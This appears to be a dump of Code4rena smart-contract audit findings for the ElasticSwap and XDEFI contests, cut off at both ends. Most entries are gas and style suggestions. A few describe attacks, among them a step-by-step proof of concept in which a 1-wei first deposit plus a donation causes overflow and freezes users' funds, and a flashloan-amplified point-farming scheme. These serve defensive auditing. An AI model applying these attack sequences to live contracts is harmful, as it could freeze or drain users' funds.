- Gamma ) = Gamma * Ro         Ro * Gamma \u0394Ro = --------------          1 - Gamma  ```  #### When baseToken rebase down  ```md When: new liquidity provider addLiquidity with \u0394X baseToken (\u0394X <= max\u0394X or \u0394Y <= \u03b1^)  After addLiquidity() -   baseToken belongs to the newLP: \u0394XOfNewLP -   quoteToken belongs to the newLP: \u0394YOfNewLP  \u0394X can be divided into 2 parts: -   \u0394XToY:  the part used for swap \u0394YOfNewLP. \u0394YOfNewLP = \u0394XToY / Omega                 (b1) -   \u0394X - \u0394XToY: the rest as \u0394XOfNewLP   The ratio of newly minted LP tokens for new liquidity provider to the new totalSupply (Ro'): Gamma            \u0394Ro        \u0394X - \u0394XToY     \u0394YOfNewLP          = --------- = ------------ = ------------                                  (b2)         Ro + \u0394Ro     Alpha + \u0394X         Y                                        \u0394XToY / Omega                                = -------------    // substituting (b1)                                       Y                                       \u0394XToY                                     = -------------                                   (b_exp1)                                    Y * Omega     \u27fa  (\u0394X - \u0394XToY) * Y = (Alpha + \u0394X) * \u0394XToY / Omega \u0394X * Y - \u0394XToY * Y = (Alpha + \u0394X) * \u0394XToY / Omega \u0394X * Y = \u0394XToY * Y + (Alpha + \u0394X) * \u0394XToY / Omega        = \u0394XToY * ( Y + (Alpha + \u0394X) / Omega )                    \u0394X * Y \u0394XToY = --------------------------                                               (b_r1)          Y + (Alpha + \u0394X) / Omega    Continue from (b_exp1)              \u0394XToY     Gamma = -------------           Y * Omega                      \u0394X * Y       = ----------------------------------------    // substituting (b_r1)          (Y + (Alpha + \u0394X) / Omega) * Y * Omega                 \u0394X / Omega       = ---------------------------                                               (b_r2(2))          Y + (Alpha + \u0394X) / Omega                     \u0394X       = ---------------------------                                               (b_r2(1))          Y * Omega + (Alpha + \u0394X)                 \u0394X       = -------------------  // substituting (Omega = X/Y)          X + (Alpha + \u0394X)    Gamma is the ratio of \u0394X to the total amounts of baseToken and quoteToken after addLiquidity: -   (b_r2(1)) is the formula in the terms of baseToken -   (b_r2(2)) is the formula in the terms of quoteToken   Based on (b2):             \u0394Ro     Gamma = ---------          Ro + \u0394Ro  \u27fa         Ro * Gamma \u0394Ro = --------------          1 - Gamma  ```  ### Recommendation  Update code and document using the correct formula for \u0394Ro.  "}, {"title": "Making the MathLib internal", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  UncleGrandpa925   # Vulnerability details  ## Impact Saving gas-cost for all transactions interacting with the pools.   Currently the bytecode size of the Exchange is 10.99KB. Making the entire MathLib internal (therefore embedding it into the Exchange) will only make the bytecode size grows to 14.45KB, which is well below the limit of 24576 bytes. Doing this will save at least 2300 gas for every transaction since that the cost for cold-load the bytecode of the library, and also saving the gas cost of doing delegate call to the library instead of doing internal call.  ## Recommended Mitigation Steps Converting all public properties in the MathLib to internal.  ## Note  Normally I'm not into farming gas-optimization issues, but I think this is worth doing.   "}, {"title": "Comment missing function parameter", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/114", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The Exchange.sol constructor has a natspec comment which is missing the _exchangeFactoryAddress function parameter. Issues with comments are low risk based on [Code4rena risk categories](https://docs.code4rena.com/roles/wardens/judging-criteria#estimating-risk-tl-dr).  ## Proof of Concept  [Exchange.sol line 62](https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/contracts/Exchange.sol#L58-L68) is missing a comment indicating the _exchangeFactoryAddress input parameter is required.  ## Recommended Mitigation Steps  Make sure natspec comments include all parameters and add one for the _exchangeFactoryAddress parameter.  "}, {"title": "Users can grief name and symbol for a market, DAO unable to change", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/110", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  camden   # Vulnerability details  ## Impact https://github.com/ElasticSwap/elasticswap/blob/a90bb67e2817d892b517da6c1ba6fae5303e9867/src/contracts/ExchangeFactory.sol#L38  A user could create an exchange with a name and symbol that is misleading or allows phishing into an exchange created with an unexpected token.  ## Recommended Mitigation Steps Allow the ExchangeFactory to change the name and symbol of an exchange.  "}, {"title": "`removeLiquidity.sol#baseTokenQtyToRemoveFromInternalAccounting` should not be cached", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/94", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  0x0x0x   # Vulnerability details  `removeLiquidity.sol#baseTokenQtyToRemoveFromInternalAccounting` is used only once and caching it does cost extra gas. So ```         uint256 baseTokenQtyToRemoveFromInternalAccounting =             (_liquidityTokenQty * internalBalances.baseTokenReserveQty) /                 totalSupplyOfLiquidityTokens;          internalBalances             .baseTokenReserveQty -= baseTokenQtyToRemoveFromInternalAccounting; ``` can be replaced with ```          internalBalances.baseTokenReserveQty -= (_liquidityTokenQty * internalBalances.baseTokenReserveQty) / totalSupplyOfLiquidityTokens; ```  "}, {"title": "`internalBalance` state variable is read and written multiple times within a single transaction", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/55", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  Ruhum   # Vulnerability details  ## Impact The `internalBalances` state variable is used extensively throughout the `Exchange` contract. Reading and writing to storage is expensive. Instead of working the state variable directly, the functions should work with a  cached memory variable. The final value should then be saved to storage.  ## Proof of Concept There are too many places where this is happening. Most prominently in the `MathLib` library, where the state variable is passed around as a function parameter. Working with a cached version will be way cheaper.   ## Tools Used  ## Recommended Mitigation Steps Replace the storage variable with a cached memory variable. The library has to be refactored to return the modified values so they can be written back to storage.  "}, {"title": "Gas in `MathLib.sol:calculateQtyToReturnAfterFees()`: Avoid expensive calculation by checking if `_tokenASwapQty == 0 || _tokenBReserveQty == 0`", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/48", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Saving the gas cost from the calculation  ## Proof of Concept See the `@audit-info` tags: ``` File: MathLib.sol 141:     function calculateQtyToReturnAfterFees( 142:         uint256 _tokenASwapQty, 143:         uint256 _tokenAReserveQty, 144:         uint256 _tokenBReserveQty, 145:         uint256 _liquidityFeeInBasisPoints 146:     ) public pure returns (uint256 qtyToReturn) { 147:         uint256 tokenASwapQtyLessFee = //@audit-info == 0 if _tokenASwapQty == 0 148:             _tokenASwapQty * (BASIS_POINTS - _liquidityFeeInBasisPoints);  149:         qtyToReturn = 150:             (tokenASwapQtyLessFee * _tokenBReserveQty) / //@audit-info 0 is possible if _tokenBReserveQty == 0 or above is equal to 0 151:             ((_tokenAReserveQty * BASIS_POINTS) + tokenASwapQtyLessFee); 152:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Return 0 if `_tokenASwapQty == 0 || _tokenBReserveQty == 0` or the `&&` equivalent. Here's an example: ``` File: MathLib.sol 141:     function calculateQtyToReturnAfterFees( 142:         uint256 _tokenASwapQty, 143:         uint256 _tokenAReserveQty, 144:         uint256 _tokenBReserveQty, 145:         uint256 _liquidityFeeInBasisPoints 146:     ) public pure returns (uint256 qtyToReturn) { 147:         if(_tokenASwapQty != 0 && _tokenBReserveQty != 0){ 148:             uint256 tokenASwapQtyLessFee = _tokenASwapQty *  149:                 (BASIS_POINTS - _liquidityFeeInBasisPoints);  150:             qtyToReturn = (tokenASwapQtyLessFee * _tokenBReserveQty) /  151:                 ((_tokenAReserveQty * BASIS_POINTS) + tokenASwapQtyLessFee); 152:         } 153:     } ``` (here `qtyToReturn` if set to 0 by default so the value returned would be 0)  "}, {"title": "Gas: Reorder require statements `MathLib.sol:calculateAddLiquidityQuantities()` to save gas on revert", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact  Some of the require statements can be placed earlier to reduce gas usage on revert.  ## Proof of Concept  The following can be reordered to save gas on revert:  ``` File: MathLib.sol 464:                 tokenQtys.baseTokenQty += baseTokenQtyFromDecay; 465:                 tokenQtys.quoteTokenQty += quoteTokenQtyFromDecay; 466:                 tokenQtys.liquidityTokenQty += liquidityTokenQtyFromDecay; 467:  468:                 require( 469:                     tokenQtys.baseTokenQty >= _baseTokenQtyMin, 470:                     \"MathLib: INSUFFICIENT_BASE_QTY\" 471:                 ); 472:  473:                 require( 474:                     tokenQtys.quoteTokenQty >= _quoteTokenQtyMin, 475:                     \"MathLib: INSUFFICIENT_QUOTE_QTY\" 476:                 ); ``` to ``` File: MathLib.sol 464:                 tokenQtys.baseTokenQty += baseTokenQtyFromDecay; 465:                  466:                 require( 467:                     tokenQtys.baseTokenQty >= _baseTokenQtyMin, 468:                     \"MathLib: INSUFFICIENT_BASE_QTY\" 469:                 ); 470:  471:                 tokenQtys.quoteTokenQty += quoteTokenQtyFromDecay; 472:  473:                 require( 474:                     tokenQtys.quoteTokenQty >= _quoteTokenQtyMin, 475:                     \"MathLib: INSUFFICIENT_QUOTE_QTY\" 476:                 ); 477:  478:                 tokenQtys.liquidityTokenQty += liquidityTokenQtyFromDecay; ```  ## Tools Used  VS Code   ## Recommended Mitigation Steps  Relocate the said require statements  "}, {"title": "Gas: Conditional flow optimization in `Exchange.sol:removeLiquidity()`", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/28", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   It's possible to save gas by optimizing conditional flows to avoid some unnecessary opcodes    ## Proof of Concept   In `Exchange.sol:removeLiquidity()`, the code is as follows: ``` File: Exchange.sol 225:         if (quoteTokenQtyToReturn > internalBalances.quoteTokenReserveQty) { 226:             internalBalances.quoteTokenReserveQty = 0; 227:         } else { 228:             internalBalances.quoteTokenReserveQty -= quoteTokenQtyToReturn; 229:         } ```   However, this can be optimized :   - Strict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas)   - In this case here, if `quoteTokenQtyToReturn == internalBalances.quoteTokenReserveQty`: `internalBalances.quoteTokenReserveQty = 0` should be used   - Avoiding the else clause would avoid some opcodes (1 SUB = 3 gas, 2 MLOADs = 6 gas...)      The code would become:   ``` File: Exchange.sol 225:         if (quoteTokenQtyToReturn >= internalBalances.quoteTokenReserveQty) { 226:             internalBalances.quoteTokenReserveQty = 0; 227:         } else { 228:             internalBalances.quoteTokenReserveQty -= quoteTokenQtyToReturn; 229:         } ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use the non-strict greater-than operator in this particular case   "}, {"title": "Gas: `ExchangeFactory.feeAddress()` should be declared external", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/26", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Public functions that are never called by the contract should be declared external to save gas.  ## Proof of Concept Instances include: ``` File: ExchangeFactory.sol 81:     function feeAddress() public view virtual override returns (address) { 82:         return feeAddress_; 83:     } ```  ## Tools Used Slither  ## Recommended Mitigation Steps Change the visibility to `external`  "}, {"title": "Event for merge", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/197", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  0xsanson   # Vulnerability details  Not an issue.  I noticed that the `merge` function doesn't have an event associated with it. Depending on the kind of offchain analysis/tools you will end up using, an event here may turn up useful to know which NFTs got merged together into a new one.  ## Recommended Mitigation Steps Add an event which contains `uint256[] memory tokenIds_` and `tokenId_`.  "}, {"title": "Improper event declaration", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/196", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Czar102   # Vulnerability details  ## Impact  Proper event declaration eases off-chain monitoring.  ## Proof of Concept  In the case of qualitative variables, it is recommended to use `indexed` keyword.  Despite the `uint duration` argument seems to be a quantitative one, it is limited to few values, which specify the \"locking mode\".  ## Recommended Mitigation Steps  `uint duration` variable should be considered qualitative and be marked `indexed` in the following events: ``` event LockPeriodSet(uint256 duration, uint8 bonusMultiplier); event LockPositionCreated(uint256 indexed tokenId, address indexed owner, uint256 amount, uint256 duration); ```   "}, {"title": "\"Safe\" ERC20 functions for XDEFI?", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/194", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  0xsanson   # Vulnerability details  ## Impact Throughout the code the safe functions `safeTransfer` and `safeTransferFrom` are used when dealing with XDEFI. Isn't this token a standard ERC20? I believe the normal ERC20 transfer functions can be used. The advantage is gaining some 100s gas otherwise spent in unneeded logic.  ## Proof of Concept grep safeT *.sol  ## Recommended Mitigation Steps Consider removing the SafeERC20 library.  "}, {"title": "Possible profitability manipulations", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/193", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Czar102   # Vulnerability details  ## Impact  An owner of the contract may, by ordering their or others' locking transactions, significantly increase or decrease `bonusMultiplier` for some set of transactions.  So, by mining a single block, an owner can lower other's bonus multipliers, execute locking transactions and then restore bonus multipliers.  A user might send a locking transaction in a similar time as an owner lowers the multipliers, resulting in lowering the revenue against data presented to the user.  An owner can also pass ownership to a contract that will change bonus multipliers and lock funds with a very high bonus multiplier, then restore previous multipliers' state not to let others do the same. This way, the owner can gain an unfair advantage over others.  ## Recommended Mitigation Steps  Use a timelock for `setLockPeriods(...)` function and require passing `bonusMultiplier` in locking functions, revert if they are different from the state variables.   "}, {"title": "Adding unchecked directive can save gas", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/185", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  ## Proof of Concept  ``` https://github.com/XDeFi-tech/xdefi-distribution/blob/master/contracts/XDEFIDistribution.sol#L274 ```  ## Tools Used  None   ## Recommended Mitigation Steps  Consider applying unchecked arithmetic where overflow/underflow is not possible.  "}, {"title": "No option to unlock funds before set duration", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/183", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  If a user locks funds in the contract, they can only withdraw funds by calling functions that in turn call the `_unlock()` function. The `_unlock()` function requires the position to have block.timestamp >= position.expiry. If there is a problem with the contract, with the XDEFI ERC20 token, or a user changes their mind and wants their funds back, they do not have this option. This can be more problematic with very long lock duration values.  ## Proof of Concept  There is a hard requirement that block.timestamp >= uint256(expiry) for any position before it can be unlocked and the funds released. All code paths that allow a use to withdraw their XDEFI rely on the `_unlock()` function:  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L305  ## Recommended Mitigation Steps  Different options exist to assist users with this issue. One would be to keep lock duration values small, especially when the contract is first released to users. Another is to add an emergency withdrawal function that has the onlyOwner modifier, such as using OpenZeppelin's Pausable module: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol   "}, {"title": "Unnecessary require statement", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/179", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  There is a require statement that contains the comment \"Throw convenient error if trying to re-lock more than was unlocked. `amountUnlocked_ - lockAmount_` would have reverted below anyway.\" This comment is correct that the require statement is unnecessary and removing saves on gas during relock functions.  ## Proof of Concept  The unnecessary require statement is in the `relock()` and `relockBatch()` functions of XDEFIDistribution.sol: https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L115 https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L170  ## Recommended Mitigation Steps  Remove the unnecessary require statement to save gas  "}, {"title": "Wrong revert message", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/171", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Czar102   # Vulnerability details  ## Impact  Wrong revert messages might lead to confusion.  ## Proof of Concept  In line 52 of XDEFIDistribution, the reason for a fail of a reentrant call is `\"LOCKED\"`. In DeFi, it usually means that contract's functionality is temporarily limited. This is not true in this case.  ## Recommended Mitigation Steps  Consider changing the revert string to `\"REENTRY_NOT_ALLOWED\"`.  "}, {"title": "Malicious early user/attacker can malfunction the contract and even freeze users' funds in edge cases", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/156", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151  ```solidity     _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached); ```  In the current implementation,  `_pointsPerUnit` can be changed in `updateDistribution()` which can be called by anyone.   A malicious early user can `lock()` with only `1 wei` of XDEFI and makes `_pointsPerUnit` to be very large, causing future users not to be able to `lock()` and/or `unlock()` anymore due to overflow in arithmetic related to `_pointsMultiplier`.  As a result, the contract can be malfunctioning and even freeze users' funds in edge cases.  ### PoC  Given:  - bonusMultiplierOf[30 days] = 100  1. Alice `lock()` `1 wei` of XDEFI for 30 days as the first user of the contract. Got `1` units, and `totalUnits` now is `1`; 2. Alice sends `170141183460469 wei` of `XDEFI` to the contract and calls `updateDistribution()`:  ```solidity     _pointsPerUnit += ((170141183460469 * 2**128) / 1); ```  3. Bob tries to `lock()` `1,100,000 * 1e18` of `XDEFI` for 30 days, the tx will fail, as `_pointsPerUnit * units` overlows; 4. Bob `lock()` `1,000,000 * 1e18` of `XDEFI` for 30 days; 5. The rewarder sends `250,000 * 1e18` of `XDEFI` to the contract and calls `updateDistribution()`:   ```solidity     _pointsPerUnit += ((250_000 * 1e18 * 2**128) / (1_000_000 * 1e18 + 1)); ```  6. 30 days later, Bob tries to call `unlock()`, the tx will fail, as `_pointsPerUnit * units` overflows.    ### Recomandation  Uniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.  The same solution should work here, i.e., on constructor set an initial amount (like 1e8) for `totalUnits`    https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44  ```solidity constructor (address XDEFI_, string memory baseURI_, uint256 zeroDurationPointBase_) ERC721(\"Locked XDEFI\", \"lXDEFI\") {         require((XDEFI = XDEFI_) != address(0), \"INVALID_TOKEN\");         owner = msg.sender;         baseURI = baseURI_;         _zeroDurationPointBase = zeroDurationPointBase_;          totalUnits = 100_000_000;     } ```  "}, {"title": "`XDEFIDistribution.sol#_updateXDEFIBalance()` Avoiding unnecessary storage writes can save gas", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/151", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  WatchPug   # Vulnerability details  Storage writes (`SSTORE`) to `distributableXDEFI` may not be needed when `previousDistributableXDEFI == currentDistributableXDEFI`, therefore the code can be reorganized to save gas from unnecessary storage writes.  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L330-L336  ```solidity function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {     uint256 previousDistributableXDEFI = distributableXDEFI;     uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this)) - totalDepositedXDEFI;      return _toInt256Safe(currentDistributableXDEFI) - _toInt256Safe(previousDistributableXDEFI); } ```  ### Recommendation  Change to:  ```solidity function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {     uint256 previousDistributableXDEFI = distributableXDEFI;     uint256 currentDistributableXDEFI = IERC20(XDEFI).balanceOf(address(this)) - totalDepositedXDEFI;      newFundsTokenBalance_ = _toInt256Safe(currentDistributableXDEFI) - _toInt256Safe(previousDistributableXDEFI);     if (newFundsTokenBalance_ != 0) {         distributableXDEFI = currentDistributableXDEFI;     } } ```  "}, {"title": "`_zeroDurationPointBase` can potentially be exploited to get more scores", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/139", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  WatchPug   # Vulnerability details  `_zeroDurationPointBase` can be set at deploy time so that locks with 0 duration can get scores.  However, if the value of `_zeroDurationPointBase` is being set high enough. It can potentially be exploited by repeatedly lock(), and unlock() with 0 duration to get scores.  This can get amplified with flashloans.  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L245-L247  ```solidity function _getPoints(uint256 amount_, uint256 duration_) internal view returns (uint256 points_) {     return amount_ * (duration_ + _zeroDurationPointBase); } ```  ## Recommendation  Consider changing `_zeroDurationPointBase` to a constant of value `1`.  "}, {"title": "Implicit casts should be explicit as per the global code style", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/129", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Code clarity / code style  ## Proof of Concept At the following places, the casts are implicit, whereas the project's style hints at explicit casts everywhere : https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L255 https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L269 https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L314  ## Tools Used VS Code  ## Recommended Mitigation Steps Use explicit casts everywhere for unsigned integers, as it's the practice everywhere else  "}, {"title": "&& operator can use more gas", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/128", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  rfa   # Vulnerability details  ## Impact more expensive gas usage  ## Proof of Concept instead of using operator && on single require check (XDEFIDistribution.sol line 255). using double require check can save more gas:   require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");  ## Tools Used  ## Recommended Mitigation Steps require(amount_ != uint256(0), \"INVALID_AMOUNT\" ); require(amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");  "}, {"title": "`XDEFIDistribution.sol#relock()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/123", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L120-L125  ```solidity=120 uint256 withdrawAmount = amountUnlocked_ - lockAmount_;  if (withdrawAmount != uint256(0)) {     // Send the excess XDEFI to the destination, if needed.     SafeERC20.safeTransfer(IERC20(XDEFI), destination_, withdrawAmount); } ```  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L175-L180  ```solidity=175 uint256 withdrawAmount = amountUnlocked_ - lockAmount_;  if (withdrawAmount != uint256(0)) {     // Send the excess XDEFI to the destination, if needed.     SafeERC20.safeTransfer(IERC20(XDEFI), destination_, withdrawAmount); } ``` ### Recommendation  Change to:  ```solidity if (amountUnlocked_ > lockAmount_) {     SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_ - lockAmount_); } ```  - Removed a local variable: `withdrawAmount`; - Only do the arithmetic when needed: `amountUnlocked_ - lockAmount_`.  "}, {"title": "Gas optimization in XDEFIDistribution.sol - shifting instead of multiplying or dividing by power of 2", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  OriDabush   # Vulnerability details  ## XDEFIDistribution.sol lines 151, 338-344 Instead of multiplying by _pointsMultiplier, which is 2 ** 128, it is more efficient to shift by 128 (x * (2 ** 128) = x << 128), same for dividing (x / (2 ** 128) = x >> 128) ```sol // line 151 - old _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);  // line 151 - new _pointsPerUnit += ((newXDEFI << 128) / totalUnitsCached);   // lines 338-344 - old return (     _toUint256Safe(         _toInt256Safe(_pointsPerUnit * uint256(units_)) +         pointsCorrection_     ) / _pointsMultiplier ) + uint256(depositedXDEFI_);  // lines 338-344 - new return (     _toUint256Safe(         _toInt256Safe(_pointsPerUnit * uint256(units_)) +         pointsCorrection_     ) >> 128 ) + uint256(depositedXDEFI_); ```  "}, {"title": "Gas optimization in XDEFIDistribution.sol - variable that is not used", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/120", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  OriDabush   # Vulnerability details  ## XDEFIDistribution.sol line 332  The \"currentDistributableXDEFI\" variable is not used (can use distributableXDEFI instead). ```sol // function before: function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {     uint256 previousDistributableXDEFI = distributableXDEFI;     uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this)) - totalDepositedXDEFI;     return _toInt256Safe(currentDistributableXDEFI) - _toInt256Safe(previousDistributableXDEFI); }  // function after: function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {     uint256 previousDistributableXDEFI = distributableXDEFI;     distributableXDEFI = IERC20(XDEFI).balanceOf(address(this)) - totalDepositedXDEFI;     return _toInt256Safe(distributableXDEFI) - _toInt256Safe(previousDistributableXDEFI); } ```  "}, {"title": "Sub-optimal calls should be allowed instead of reverted as resending the transaction will cost more gas", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/116", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  WatchPug   # Vulnerability details  In the current implementation, when `_unlockBatch()` is called with `tokenIds_.length == 1`, the transaction will be reverted with an error `USE_UNLOCK`.  Even though it's sub-optimal to use `relockBatch()` and `unlockBatch()` for only 1 tokenId, reverting and requiring the user to resend the transaction to another method still costs more gas than allowing it.  Therefore, we sugguest not to revert in `_unlockBatch()` when `tokenIds_.length == 1`.  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L320-L328  ```solidity=320     function _unlockBatch(address account_, uint256[] memory tokenIds_) internal returns (uint256 amountUnlocked_) {         uint256 count = tokenIds_.length;         require(count > uint256(1), \"USE_UNLOCK\");          // Handle the unlock for each position and accumulate the unlocked amount.         for (uint256 i; i < count; ++i) {             amountUnlocked_ += _unlock(account_, tokenIds_[i]);         }     } ```  ### Recommendation  Change to:  ```solidity     function _unlockBatch(address account_, uint256[] memory tokenIds_) internal returns (uint256 amountUnlocked_) {         uint256 count = tokenIds_.length;         require(count > 0, \"NO_TOKEN_IDS\");          // Handle the unlock for each position and accumulate the unlocked amount.         for (uint256 i; i < count; ++i) {             amountUnlocked_ += _unlock(account_, tokenIds_[i]);         }     } ```  "}, {"title": "Constants are not explicitly declared", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/115", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  WatchPug   # Vulnerability details  It's a best practice to use constant variables rather than literal values to make the code easier to understand and maintain.  Consider defining a constant variable for the literal value used and giving it a clear and self-explanatory name.  Instances include:  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L82-L82  ```solidity require(duration <= uint256(18250 days), \"INVALID_DURATION\"); ```  Consider changing `uint256(18250 days)` to `MAX_DURATION` constant.   "}, {"title": "gas optimization", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/103", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Fitraldys   # Vulnerability details  